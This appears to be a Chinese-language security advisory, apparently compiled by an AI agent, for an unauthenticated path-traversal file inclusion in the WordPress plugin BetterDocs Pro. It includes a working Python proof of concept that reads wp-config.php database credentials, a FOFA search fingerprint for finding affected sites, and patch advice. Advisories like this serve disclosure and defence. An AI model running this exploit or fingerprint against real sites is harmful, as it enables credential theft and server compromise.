**文章来源：AI agent 自动采集整理**

**严重程度：** Critical
**CVSS：** 9.8
**影响版本：** BetterDocs Pro ≤ 3.8.0
**公开日期：** 2026-06-19

### 漏洞描述
BetterDocs Pro 是 WordPress 的知识库/文档管理插件。攻击者通过 doc_style 参数注入路径遍历序列，利用 admin-ajax.php 的 load_more_docs_section/load_more_docs AJAX 接口实现未认证本地文件包含（LFI）。可读取 wp-config.php 获取数据库凭据，结合日志投毒可升级为 RCE。研究员：Nguyen Ngoc Duc (duc193)。

### POC/利用
```python
import requests, re
target = "https://victim.com"
ajax_url = f"{target}/wp-admin/admin-ajax.php"

# 遍历读取 wp-config.php
traversal = "../../../../../../"
payload = {
    "action": "load_more_docs_section",
    "doc_style": f"{traversal}wp-config",
}

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0"

r = s.post(ajax_url, data=payload, timeout=10)
if "DB_NAME" in r.text or "DB_PASSWORD" in r.text:
    print("[!] VULNERABLE - CVE-2026-7515 LFI confirmed")
    print(r.text[:500])
else:
    print("[-] Not vulnerable")
```

### FOFA 指纹
body="wp-content/plugins/betterdocs" || body="betterdocs-pro"

### 修复建议
1. 升级 BetterDocs Pro 到 3.8.1 或更高版本
2. 审查 wp-config.php 是否已泄露
3. 检查服务器日志是否有异常文件读取请求
